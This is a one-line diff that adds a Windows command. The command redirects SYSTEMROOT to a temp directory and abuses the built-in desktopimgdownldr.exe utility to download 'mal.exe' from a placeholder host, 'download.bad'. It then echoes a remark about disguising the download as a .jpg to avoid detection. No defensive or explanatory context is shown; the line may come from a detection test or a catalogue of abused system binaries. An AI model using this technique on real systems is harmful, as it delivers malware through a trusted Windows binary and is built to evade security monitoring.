@@ -1,0 +1,1 @@
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://download.bad/mal.exe /eventName:desktopimgdownldr && echo "print .jpg to avoid detection"
